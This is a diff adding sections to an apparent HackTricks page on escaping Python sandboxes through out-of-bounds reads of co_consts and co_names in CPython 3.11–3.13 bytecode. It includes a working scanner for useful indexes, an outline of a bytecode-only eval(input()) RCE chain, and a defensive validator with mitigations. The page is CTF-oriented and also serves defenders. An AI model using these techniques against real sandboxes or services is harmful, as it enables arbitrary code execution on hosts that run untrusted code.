@@ -234,7 +234,125 @@ builtins = getattr(
 builtins['eval'](builtins['input']())
 ```
 
+---
+
+### Version notes and affected opcodes (Python 3.11–3.13)
+
+- CPython bytecode opcodes still index into `co_consts` and `co_names` tuples by integer operands. If an attacker can force these tuples to be empty (or smaller than the maximum index used by the bytecode), the interpreter will read out-of-bounds memory for that index, yielding an arbitrary PyObject pointer from nearby memory. Relevant opcodes include at least:
+  - `LOAD_CONST consti` → reads `co_consts[consti]`.
+  - `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → read names from `co_names[...]` (for 3.11+ note `LOAD_ATTR`/`LOAD_GLOBAL` store flag bits in the low bit; the actual index is `namei >> 1`). See the disassembler docs for exact semantics per version. [Python dis docs].
+- Python 3.11+ introduced adaptive/inline caches that add hidden `CACHE` entries between instructions. This doesn’t change the OOB primitive; it only means that if you handcraft bytecode, you must account for those cache entries when building `co_code`.
+
+Practical implication: the technique in this page continues to work on CPython 3.11, 3.12 and 3.13 when you can control a code object (e.g., via `CodeType.replace(...)`) and shrink `co_consts`/`co_names`.
+
+### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)
+
+If you prefer to probe for interesting objects directly from bytecode rather than from high-level source, you can generate minimal code objects and brute force indices. The helper below automatically inserts inline caches when needed.
+
+```python
+import dis, types
+
+def assemble(ops):
+    # ops: list of (opname, arg) pairs
+    cache = bytes([dis.opmap.get("CACHE", 0), 0])
+    out = bytearray()
+    for op, arg in ops:
+        opc = dis.opmap[op]
+        out += bytes([opc, arg])
+        # Python >=3.11 inserts per-opcode inline cache entries
+        ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
+        out += cache * ncache
+    return bytes(out)
+
+# Reuse an existing function's code layout to simplify CodeType construction
+base = (lambda: None).__code__
+
+# Example: probe co_consts[i] with LOAD_CONST i and return it
+# co_consts/co_names are intentionally empty so LOAD_* goes OOB
+
+def probe_const(i):
+    code = assemble([
+        ("RESUME", 0),          # 3.11+
+        ("LOAD_CONST", i),
+        ("RETURN_VALUE", 0),
+    ])
+    c = base.replace(co_code=code, co_consts=(), co_names=())
+    try:
+        return eval(c)
+    except Exception:
+        return None
+
+for idx in range(0, 300):
+    obj = probe_const(idx)
+    if obj is not None:
+        print(idx, type(obj), repr(obj)[:80])
+```
+
+Notes
+- To probe names instead, swap `LOAD_CONST` for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust your stack usage accordingly.
+- Use `EXTENDED_ARG` or multiple bytes of `arg` to reach indexes >255 if needed. When building with `dis` as above, you only control the low byte; for larger indexes, construct the raw bytes yourself or split the attack across multiple loads.
+
+### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
+
+Once you have identified a `co_consts` index that resolves to the builtins module, you can reconstruct `eval(input())` without any `co_names` by manipulating the stack:
+
+```python
+# Build co_code that:
+# 1) LOAD_CONST <builtins_idx> → push builtins module
+# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
+#    out of objects living nearby in memory (e.g., from method tables),
+# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
+# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
+```
+
+This approach is useful in challenges that give you direct control over `co_code` while forcing `co_consts=()` and `co_names=()` (e.g., BCTF 2024 “awpcode”). It avoids source-level tricks and keeps payload size small by leveraging bytecode stack ops and tuple builders.
+
+### Defensive checks and mitigations for sandboxes
+
+If you are writing a Python “sandbox” that compiles/evaluates untrusted code or manipulates code objects, do not rely on CPython to bounds-check tuple indexes used by bytecode. Instead, validate code objects yourself before executing them.
+
+Practical validator (rejects OOB access to co_consts/co_names)
+
+```python
+import dis
+
+def max_name_index(code):
+    max_idx = -1
+    for ins in dis.get_instructions(code):
+        if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
+                          "IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
+            namei = ins.arg or 0
+            # 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
+            if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
+                namei >>= 1
+            max_idx = max(max_idx, namei)
+    return max_idx
+
+def max_const_index(code):
+    return max([ins.arg for ins in dis.get_instructions(code)
+                if ins.opname == "LOAD_CONST"] + [-1])
+
+def validate_code_object(code: type((lambda:0).__code__)):
+    if max_const_index(code) >= len(code.co_consts):
+        raise ValueError("Bytecode refers to const index beyond co_consts length")
+    if max_name_index(code) >= len(code.co_names):
+        raise ValueError("Bytecode refers to name index beyond co_names length")
+
+# Example use in a sandbox:
+# src = input(); c = compile(src, '<sandbox>', 'exec')
+# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
+# validate_code_object(c)
+# eval(c, {'__builtins__': {}})
+```
+
+Additional mitigation ideas
+- Don’t allow arbitrary `CodeType.replace(...)` on untrusted input, or add strict structural checks on the resulting code object.
+- Consider running untrusted code in a separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.
+
+
+
+## References
+
+- Splitline’s HITCON CTF 2022 writeup “V O I D” (origin of this technique and high-level exploit chain): https://blog.splitline.tw/hitcon-ctf-2022/
+- Python disassembler docs (indices semantics for LOAD_CONST/LOAD_NAME/etc., and 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags): https://docs.python.org/3.13/library/dis.html
 {{#include ../../../banners/hacktricks-training.md}}
-
-
-
